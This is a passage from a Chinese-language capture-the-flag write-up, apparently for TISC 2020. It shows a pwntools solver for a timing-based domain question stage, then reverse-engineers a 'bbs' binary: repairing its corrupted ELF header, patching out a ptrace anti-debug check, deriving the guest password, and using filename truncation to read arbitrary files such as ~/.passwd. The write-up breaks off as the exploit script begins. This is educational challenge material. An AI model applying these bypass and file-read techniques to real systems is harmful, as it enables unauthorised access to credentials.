    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"SUBMISSION_TOKEN?"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"exIvQfhiaBKjudkvmWrIUoAheGZEjscdPOJClxUJNTFdJbFiguftOlVacIkgQRYG"</span><span class="token punctuation">)</span>

    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        test_win <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"Do you know the domain name at "</span><span class="token punctuation">,</span> <span class="token string">"Winner"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">b"Winner"</span> <span class="token keyword">in</span> test_win<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span>
        timing <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Coordinated Universal Time"</span><span class="token punctuation">)</span>
        timing <span class="token operator">=</span> timing<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b" Coordinated Universal Time"</span><span class="token punctuation">,</span> <span class="token string">b""</span><span class="token punctuation">)</span>
        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"connects to?"</span><span class="token punctuation">)</span>

        parsed_d <span class="token operator">=</span> datetime<span class="token punctuation">.</span>strptime<span class="token punctuation">(</span>timing<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"%B %d, %Y, %I:%M:%S %p"</span><span class="token punctuation">)</span>
        parsed_d <span class="token operator">=</span> pytz<span class="token punctuation">.</span>utc<span class="token punctuation">.</span>localize<span class="token punctuation">(</span>parsed_d<span class="token punctuation">)</span>
        epoch <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>parsed_d<span class="token punctuation">.</span>timestamp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        answer <span class="token operator">=</span> get_answer<span class="token punctuation">(</span>epoch<span class="token punctuation">)</span>
        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>answer<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>answer<span class="token punctuation">)</span>


    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>运行脚本解决该题目：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ python solver.py
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Opening connection to fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg on port <span class="token number">31090</span>: Done
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting <span class="token builtin class-name">local</span> process <span class="token string">'/bin/sh'</span><span class="token builtin class-name">:</span> pid <span class="token number">18545</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Receiving all data: Done <span class="token punctuation">(</span>49B<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Process <span class="token string">'/bin/sh'</span> stopped with <span class="token builtin class-name">exit</span> code <span class="token number">0</span> <span class="token punctuation">(</span>pid <span class="token number">18545</span><span class="token punctuation">)</span>
b<span class="token string">'ctoi9uj4lt0grfqozyqh0smh6do1onaqf35vj8fg81b8c.cf'</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting <span class="token builtin class-name">local</span> process <span class="token string">'/bin/sh'</span><span class="token builtin class-name">:</span> pid <span class="token number">18546</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Receiving all data: Done <span class="token punctuation">(</span>50B<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Process <span class="token string">'/bin/sh'</span> stopped with <span class="token builtin class-name">exit</span> code <span class="token number">0</span> <span class="token punctuation">(</span>pid <span class="token number">18546</span><span class="token punctuation">)</span>
b<span class="token string">'evp92cfszcejb3ac0t5o0sn7zb3z2nf89zztftu1kxt7nb.ga'</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting <span class="token builtin class-name">local</span> process <span class="token string">'/bin/sh'</span><span class="token builtin class-name">:</span> pid <span class="token number">18547</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Receiving all data: Done <span class="token punctuation">(</span>56B<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Process <span class="token string">'/bin/sh'</span> stopped with <span class="token builtin class-name">exit</span> code <span class="token number">0</span> <span class="token punctuation">(</span>pid <span class="token number">18547</span><span class="token punctuation">)</span>
b<span class="token string">'nhiz9blh6n1tut9s4w5mbk3lyh6vur80cvf2k6ttee3u.catbox.moe'</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting <span class="token builtin class-name">local</span> process <span class="token string">'/bin/sh'</span><span class="token builtin class-name">:</span> pid <span class="token number">18548</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Receiving all data: Done <span class="token punctuation">(</span>47B<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Process <span class="token string">'/bin/sh'</span> stopped with <span class="token builtin class-name">exit</span> code <span class="token number">0</span> <span class="token punctuation">(</span>pid <span class="token number">18548</span><span class="token punctuation">)</span>
b<span class="token string">'2yuowtvj496xbdeu9omxrb86qfb4x3ttula7s.nyaa.net'</span>
<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting <span class="token builtin class-name">local</span> process <span class="token string">'/bin/sh'</span><span class="token builtin class-name">:</span> pid <span class="token number">18644</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Receiving all data: Done <span class="token punctuation">(</span>40B<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Process <span class="token string">'/bin/sh'</span> stopped with <span class="token builtin class-name">exit</span> code <span class="token number">0</span> <span class="token punctuation">(</span>pid <span class="token number">18644</span><span class="token punctuation">)</span>
b<span class="token string">'4zfb2qiyyvti9oikcqcanmivzdn5da2lyf76.ml'</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Receiving all data: Done <span class="token punctuation">(</span>87B<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Closed connection to fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg port <span class="token number">31090</span>
b<span class="token string">' Winner Vegan Dinner...'</span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600927046303-s4-10.jpg" srcset="/img/loading.gif"><br><strong>Flag:</strong> <code>无显示，自动提交</code></p>
<h2 id="STAGE-5-Bulletin-Board-System"><a href="#STAGE-5-Bulletin-Board-System" class="headerlink" title="STAGE 5: Bulletin Board System"></a>STAGE 5: Bulletin Board System</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600927209271-s5-0.jpg" srcset="/img/loading.gif"><br>这一题提供了一个二进制文件<code>bbs</code>:</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ <span class="token function">file</span> bbs
bbs: ELF <span class="token number">64</span>-bit LSB executable, x86-64, version <span class="token number">1</span> <span class="token punctuation">(</span>GNU/Linux<span class="token punctuation">)</span>, too many section <span class="token punctuation">(</span><span class="token number">65535</span><span class="token punctuation">)</span></code></pre>

<p>对<code>bbs</code>文件进行调试：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ gdb ./bbs
GNU gdb <span class="token punctuation">(</span>Ubuntu <span class="token number">8.1</span>-0ubuntu3.2<span class="token punctuation">)</span> <span class="token number">8.1</span>.0.20180409-git
<span class="token punctuation">..</span>.
<span class="token string">"/stage5/./bbs"</span><span class="token builtin class-name">:</span> not <span class="token keyword">in</span> executable format: File truncated

gef<span class="token operator">></span>  r
Starting program:
No executable <span class="token function">file</span> specified.
Use the <span class="token string">"file"</span> or <span class="token string">"exec-file"</span> command.</code></pre>

<p>检查文件头，发现头被打乱：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ readelf -h bbs
ELF Header:
  Magic:   7f <span class="token number">45</span> 4c <span class="token number">46</span> 02 01 01 03 00 00 00 00 00 00 00 00
  Class:                             ELF64
  Data:                              <span class="token number">2</span>'s complement, little endian
  Version:                           <span class="token number">1</span> <span class="token punctuation">(</span>current<span class="token punctuation">)</span>
  OS/ABI:                            UNIX - GNU
  ABI Version:                       <span class="token number">0</span>
  Type:                              EXEC <span class="token punctuation">(</span>Executable <span class="token function">file</span><span class="token punctuation">)</span>
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x400a60
  Start of program headers:          <span class="token number">64</span> <span class="token punctuation">(</span>bytes into <span class="token function">file</span><span class="token punctuation">)</span>
  Start of section headers:          <span class="token number">65535</span> <span class="token punctuation">(</span>bytes into <span class="token function">file</span><span class="token punctuation">)</span>
  Flags:                             0x0
  Size of this header:               <span class="token number">64</span> <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span>
  Size of program headers:           <span class="token number">56</span> <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span>
  Number of program headers:         <span class="token number">6</span>
  Size of section headers:           <span class="token number">64</span> <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span>
  Number of section headers:         <span class="token number">65535</span>
  Section header string table index: <span class="token number">65535</span> <span class="token punctuation">(</span><span class="token number">3539421402</span><span class="token punctuation">)</span>
readelf: Error: Reading <span class="token number">4194240</span> bytes extends past end of <span class="token function">file</span> <span class="token keyword">for</span> section headers</code></pre>

<p>参考了<a target="_blank" rel="noopener" href="https://binaryresearch.github.io/2020/01/15/Analyzing-ELF-Binaries-with-Malformed-Headers-Part-3-Solving-A-Corrupted-Keygenme.html">这篇文章的分析</a>，这里应该使用了<a target="_blank" rel="noopener" href="https://dustri.org/b/screwing-elf-header-for-fun-and-profit.html"> ELF Screwer tool </a>来破坏头中的<code>e_shoff</code> <code>e_shnum</code> <code>e_shstrndx</code>字段值。为了修复进调试，编写修复脚本,生成修复后的文件<code>repaired_bbs</code>:</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3</span>

<span class="token keyword">from</span> lepton <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> struct <span class="token keyword">import</span> pack

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"../bbs"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        elf_file <span class="token operator">=</span> ELFFile<span class="token punctuation">(</span>f<span class="token punctuation">)</span>

    <span class="token comment"># overwrite fields values with 0x00 bytes</span>
    elf_file<span class="token punctuation">.</span>ELF_header<span class="token punctuation">.</span>fields<span class="token punctuation">[</span><span class="token string">"e_shoff"</span><span class="token punctuation">]</span> <span class="token operator">=</span> pack<span class="token punctuation">(</span><span class="token string">"&lt;Q"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
    elf_file<span class="token punctuation">.</span>ELF_header<span class="token punctuation">.</span>fields<span class="token punctuation">[</span><span class="token string">"e_shentsize"</span><span class="token punctuation">]</span> <span class="token operator">=</span> pack<span class="token punctuation">(</span><span class="token string">"&lt;H"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
    elf_file<span class="token punctuation">.</span>ELF_header<span class="token punctuation">.</span>fields<span class="token punctuation">[</span><span class="token string">"e_shnum"</span><span class="token punctuation">]</span> <span class="token operator">=</span> pack<span class="token punctuation">(</span><span class="token string">"&lt;H"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
    elf_file<span class="token punctuation">.</span>ELF_header<span class="token punctuation">.</span>fields<span class="token punctuation">[</span><span class="token string">"e_shstrndx"</span><span class="token punctuation">]</span> <span class="token operator">=</span> pack<span class="token punctuation">(</span><span class="token string">"&lt;H"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>

    <span class="token comment"># output to file</span>
    binary <span class="token operator">=</span> elf_file<span class="token punctuation">.</span>ELF_header<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> elf_file<span class="token punctuation">.</span>file_buffer<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"../repaired_bbs"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>对<code>repaired_bbs</code>进行调试：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ gdb ./repaired_bbs
GNU gdb <span class="token punctuation">(</span>Ubuntu <span class="token number">8.1</span>-0ubuntu3.2<span class="token punctuation">)</span> <span class="token number">8.1</span>.0.20180409-git
<span class="token punctuation">..</span>.
Reading symbols from ./repaired_bbs<span class="token punctuation">..</span>.<span class="token punctuation">(</span>no debugging symbols found<span class="token punctuation">)</span><span class="token punctuation">..</span>.done.
gef<span class="token operator">></span>  r
Starting program: /vagrant/ctfs/tisc/stage5/repaired_bbs
<span class="token punctuation">[</span>Inferior <span class="token number">1</span> <span class="token punctuation">(</span>process <span class="token number">15994</span><span class="token punctuation">)</span> exited normally<span class="token punctuation">]</span></code></pre>

<p>但是文件依然没有执行成功，而是直接退出。检查<code>strace</code>，看看是否存在反调试机制：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ <span class="token function">strace</span> -f ./repaired_bbs
execve<span class="token punctuation">(</span><span class="token string">"./repaired_bbs"</span>, <span class="token punctuation">[</span><span class="token string">"./repaired_bbs"</span><span class="token punctuation">]</span>, 0x7ffdae1cba08 /* <span class="token number">27</span> vars */<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span>
brk<span class="token punctuation">(</span>NULL<span class="token punctuation">)</span>                               <span class="token operator">=</span> 0x2185000
brk<span class="token punctuation">(</span>0x21861c0<span class="token punctuation">)</span>                          <span class="token operator">=</span> 0x21861c0
arch_prctl<span class="token punctuation">(</span>ARCH_SET_FS, 0x2185880<span class="token punctuation">)</span>      <span class="token operator">=</span> <span class="token number">0</span>
uname<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>sysname<span class="token operator">=</span><span class="token string">"Linux"</span>, <span class="token assign-left variable">nodename</span><span class="token operator">=</span><span class="token string">"kali"</span>, <span class="token punctuation">..</span>.<span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span>
readlink<span class="token punctuation">(</span><span class="token string">"/proc/self/exe"</span>, <span class="token string">"/stage5/repair"</span><span class="token punctuation">..</span>., <span class="token number">4096</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">38</span>
brk<span class="token punctuation">(</span>0x21a71c0<span class="token punctuation">)</span>                          <span class="token operator">=</span> 0x21a71c0
brk<span class="token punctuation">(</span>0x21a8000<span class="token punctuation">)</span>                          <span class="token operator">=</span> 0x21a8000
access<span class="token punctuation">(</span><span class="token string">"/etc/ld.so.nohwcap"</span>, F_OK<span class="token punctuation">)</span>      <span class="token operator">=</span> -1 ENOENT <span class="token punctuation">(</span>No such <span class="token function">file</span> or directory<span class="token punctuation">)</span>
ptrace<span class="token punctuation">(</span>PTRACE_TRACEME<span class="token punctuation">)</span>                  <span class="token operator">=</span> -1 EPERM <span class="token punctuation">(</span>Operation not permitted<span class="token punctuation">)</span>
exit_group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                           <span class="token operator">=</span> ?
+++ exited with <span class="token number">0</span> +++</code></pre>

<p>寻找<code>patrace</code>调用：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600928749678-s5-1.jpg" srcset="/img/loading.gif"><br>使用NOPs，得到<code>patched_bbs</code>，然后就能进行调试和执行了：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600929033761-s5-2.jpg" srcset="/img/loading.gif"></p>
<pre class="language-shell" data-language="shell"><code class="language-shell">gef<span class="token operator">></span> r
██████   █████  ██      ██ ███    ██ ██████  ██████   ██████  ███    ███ ███████
██   ██ ██   ██ ██      ██ ████   ██ ██   ██ ██   ██ ██    ██ ████  ████ ██     
██████  ███████ ██      ██ ██ ██  ██ ██   ██ ██████  ██    ██ ██ ████ ██ █████ 
██      ██   ██ ██      ██ ██  ██ ██ ██   ██ ██   ██ ██    ██ ██  ██  ██ ██    
██      ██   ██ ███████ ██ ██   ████ ██████  ██   ██  ██████  ██      ██ ███████

▚▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▞

              ██████  ██████  ███████     ██████  ██████   ██████ 
              ██   ██ ██   ██ ██          ██   ██ ██   ██ ██    ██
              ██████  ██████  ███████     ██████  ██████  ██    ██
              ██   ██ ██   ██      ██     ██      ██   ██ ██    ██
              ██████  ██████  ███████     ██      ██   ██  ██████

                               Version <span class="token number">0.1</span>.7 <span class="token punctuation">(</span>Alpha<span class="token punctuation">)</span>
▗▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▖
▘                                                                                                                                     ▝
USERNAME:</code></pre>

<p>尝试登录系统，如果输入错误的账号密码，提示我们用<code>gust</code>账户：</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">USERNAME: test
PASSWORD: test
Sorry, user accounts will only be available in the Beta.
Use account &#39;guest&#39; with the password provided at the back of your BBS PRO CD Case!</code></pre>

<p>在认证过程中，输入账号密码后，程序流转至<code>check_password</code>函数，检查密码是否最多为<code>0x19</code>字节：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600929715935-s5-4.jpg" srcset="/img/loading.gif"><br>对于每个字节，检查是奇数或者偶数索引。如果是偶数索引，取当前密码后4bits并存储，如果是奇数索引,则取前4bits与已经存储的bits合并，生成字节保存为最终构造的密码的一部分，最后与内存中的一个静态值<code>\x03\x13\x66\x23\x43\x66\x26\x16\x16\x23\x86\x36</code>比较：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600930259638-s5-5.jpg" srcset="/img/loading.gif"><br>为了生成有效的密码，编写脚本：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span>


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    key <span class="token operator">=</span> <span class="token string">b"\x03\x13\x66\x23\x43\x66\x26\x16\x16\x23\x86\x36"</span>
    password <span class="token operator">=</span> <span class="token string">b''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> key<span class="token punctuation">:</span>
        upper <span class="token operator">=</span> i <span class="token operator">>></span> <span class="token number">4</span>
        lower <span class="token operator">=</span> i <span class="token operator">&amp;</span> <span class="token number">0xf</span>
        complete <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>lower <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> upper<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span>
        password <span class="token operator">+=</span> complete
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Password: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>password<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>得到gust的密码<code>0011ff2244ffbbaaaa22hhcc</code>后,成功登陆系统：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600930564665-s5-6.jpg" srcset="/img/loading.gif"><br>经过分析，<code>View Thread</code>能让我们任意读取系统上的文件。为了读取到<code>~/.passwd</code>，使用<code>starce</code>运行程序：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ <span class="token function">cat</span> credentials
guest
0011ff2244ffbbaaaa22hhcc

r10@kali:~/tisc$ <span class="token punctuation">((</span>cat credentials<span class="token punctuation">;</span> <span class="token function">cat</span> -<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token function">strace</span> ./patched_bbs <span class="token punctuation">)</span>
execve<span class="token punctuation">(</span><span class="token string">"./patched_bbs"</span>, <span class="token punctuation">[</span><span class="token string">"./patched_bbs"</span><span class="token punctuation">]</span>, 0x7fffd92a33d0 /* <span class="token number">27</span> vars */<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span>
brk<span class="token punctuation">(</span>NULL<span class="token punctuation">)</span>                               <span class="token operator">=</span> 0x16d2000
brk<span class="token punctuation">(</span>0x16d31c0<span class="token punctuation">)</span>                          <span class="token operator">=</span> 0x16d31c0
arch_prctl<span class="token punctuation">(</span>ARCH_SET_FS, 0x16d2880<span class="token punctuation">)</span>      <span class="token operator">=</span> <span class="token number">0</span>
uname<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>sysname<span class="token operator">=</span><span class="token string">"Linux"</span>, <span class="token assign-left variable">nodename</span><span class="token operator">=</span><span class="token string">"kali"</span>, <span class="token punctuation">..</span>.<span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span>
readlink<span class="token punctuation">(</span><span class="token string">"/proc/self/exe"</span>, <span class="token string">"/stage5/patched"</span><span class="token punctuation">..</span>., <span class="token number">4096</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">46</span>
brk<span class="token punctuation">(</span>0x16f41c0<span class="token punctuation">)</span>                          <span class="token operator">=</span> 0x16f41c0
brk<span class="token punctuation">(</span>0x16f5000<span class="token punctuation">)</span>                          <span class="token operator">=</span> 0x16f5000
<span class="token punctuation">..</span>.
write<span class="token punctuation">(</span><span class="token number">1</span>, <span class="token string">"SELECT: "</span>, 8SELECT: <span class="token punctuation">)</span>                 <span class="token operator">=</span> <span class="token number">8</span>
write<span class="token punctuation">(</span><span class="token number">1</span>, <span class="token string">"<span class="token entity" title="\33">\33</span>[0m"</span>, <span class="token number">4</span><span class="token punctuation">)</span>                   <span class="token operator">=</span> <span class="token number">4</span>
read<span class="token punctuation">(</span><span class="token number">0</span>, V
<span class="token string">"V"</span>, <span class="token number">1</span><span class="token punctuation">)</span>                         <span class="token operator">=</span> <span class="token number">1</span>
read<span class="token punctuation">(</span><span class="token number">0</span>, <span class="token string">"<span class="token entity" title="\n">\n</span>"</span>, <span class="token number">1</span><span class="token punctuation">)</span>                        <span class="token operator">=</span> <span class="token number">1</span>
write<span class="token punctuation">(</span><span class="token number">1</span>, <span class="token string">"<span class="token entity" title="\33">\33</span>[0;33m"</span>, <span class="token number">7</span><span class="token punctuation">)</span>                <span class="token operator">=</span> <span class="token number">7</span>
<span class="token punctuation">..</span>.
write<span class="token punctuation">(</span><span class="token number">1</span>, <span class="token string">"THREAD: "</span>, 8THREAD: <span class="token punctuation">)</span>                 <span class="token operator">=</span> <span class="token number">8</span>
write<span class="token punctuation">(</span><span class="token number">1</span>, <span class="token string">"<span class="token entity" title="\33">\33</span>[0m"</span>, <span class="token number">4</span><span class="token punctuation">)</span>                   <span class="token operator">=</span> <span class="token number">4</span>
read<span class="token punctuation">(</span><span class="token number">0</span>, hello_word
<span class="token string">"h"</span>, <span class="token number">1</span><span class="token punctuation">)</span>                         <span class="token operator">=</span> <span class="token number">1</span>
read<span class="token punctuation">(</span><span class="token number">0</span>, <span class="token string">"e"</span>, <span class="token number">1</span><span class="token punctuation">)</span>                         <span class="token operator">=</span> <span class="token number">1</span>
read<span class="token punctuation">(</span><span class="token number">0</span>, <span class="token string">"l"</span>, <span class="token number">1</span><span class="token punctuation">)</span>                         <span class="token operator">=</span> <span class="token number">1</span>
read<span class="token punctuation">(</span><span class="token number">0</span>, <span class="token string">"l"</span>, <span class="token number">1</span><span class="token punctuation">)</span>                         <span class="token operator">=</span> <span class="token number">1</span>
read<span class="token punctuation">(</span><span class="token number">0</span>, <span class="token string">"o"</span>, <span class="token number">1</span><span class="token punctuation">)</span>                         <span class="token operator">=</span> <span class="token number">1</span>
read<span class="token punctuation">(</span><span class="token number">0</span>, <span class="token string">"_"</span>, <span class="token number">1</span><span class="token punctuation">)</span>                         <span class="token operator">=</span> <span class="token number">1</span>
read<span class="token punctuation">(</span><span class="token number">0</span>, <span class="token string">"w"</span>, <span class="token number">1</span><span class="token punctuation">)</span>                         <span class="token operator">=</span> <span class="token number">1</span>
read<span class="token punctuation">(</span><span class="token number">0</span>, <span class="token string">"o"</span>, <span class="token number">1</span><span class="token punctuation">)</span>                         <span class="token operator">=</span> <span class="token number">1</span>
read<span class="token punctuation">(</span><span class="token number">0</span>, <span class="token string">"r"</span>, <span class="token number">1</span><span class="token punctuation">)</span>                         <span class="token operator">=</span> <span class="token number">1</span>
read<span class="token punctuation">(</span><span class="token number">0</span>, <span class="token string">"d"</span>, <span class="token number">1</span><span class="token punctuation">)</span>                         <span class="token operator">=</span> <span class="token number">1</span>
read<span class="token punctuation">(</span><span class="token number">0</span>, <span class="token string">"<span class="token entity" title="\n">\n</span>"</span>, <span class="token number">1</span><span class="token punctuation">)</span>                        <span class="token operator">=</span> <span class="token number">1</span>
access<span class="token punctuation">(</span><span class="token string">"/home/bbs/threads/hello_word.thr"</span>, F_OK<span class="token punctuation">)</span> <span class="token operator">=</span> -1 ENOENT <span class="token punctuation">(</span>No such <span class="token function">file</span> or directory<span class="token punctuation">)</span>
write<span class="token punctuation">(</span><span class="token number">1</span>, <span class="token string">"<span class="token entity" title="\33">\33</span>[2J<span class="token entity" title="\33">\33</span>[H"</span>, <span class="token number">7</span>
<span class="token punctuation">)</span>              <span class="token operator">=</span> <span class="token number">7</span>
write<span class="token punctuation">(</span><span class="token number">1</span>, <span class="token string">"<span class="token entity" title="\33">\33</span>[1;31m"</span>, <span class="token number">7</span><span class="token punctuation">)</span>                <span class="token operator">=</span> <span class="token number">7</span>
write<span class="token punctuation">(</span><span class="token number">1</span>, <span class="token string">"Thread does not exist! Press ent"</span><span class="token punctuation">..</span>., 50Thread does not exist<span class="token operator">!</span> Press enter to continue<span class="token punctuation">..</span>.
<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">50</span>
write<span class="token punctuation">(</span><span class="token number">1</span>, <span class="token string">"<span class="token entity" title="\33">\33</span>[0m"</span>, <span class="token number">4</span><span class="token punctuation">)</span>                   <span class="token operator">=</span> <span class="token number">4</span>
read<span class="token punctuation">(</span><span class="token number">0</span>,</code></pre>

<p>这里我们可以控制文件名，为了绕过<code>.thr</code>，尝试用长文件名，显示路径被截断：</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">access(&quot;&#x2F;home&#x2F;bbs&#x2F;threads&#x2F;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAA&quot;, F_OK) &#x3D; -1 ENOENT (No such file or directory)</code></pre>

<p>有了这个思路，编写完整脚本<code>exploit.py</code>，执行得到falg：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
